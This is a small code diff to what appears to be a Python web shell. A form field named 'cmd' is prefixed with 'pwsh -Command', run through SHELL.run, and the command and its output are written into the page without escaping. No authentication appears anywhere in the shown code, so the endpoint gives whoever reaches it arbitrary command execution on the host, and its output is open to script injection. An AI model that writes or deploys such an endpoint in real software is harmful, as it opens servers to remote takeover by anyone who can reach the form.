@@ -18,6 +18,7 @@ def mresult(request):
 
 def mps(request):
   cmd = request.form.get("cmd")
+  cmd = "pwsh -Command " + cmd
   return template("<h3>"+cmd+"</h3>"+"<pre>"+SHELL.run(cmd)+"</pre>")
 
 def template(result):
@@ -38,6 +39,6 @@ def template(result):
       <input type="submit">
     </form>
 
-    <div class="w3-container">"''' + result + '''</div>
+    <div class="w3-container">''' + result + '''</div>
   </div>
   '''
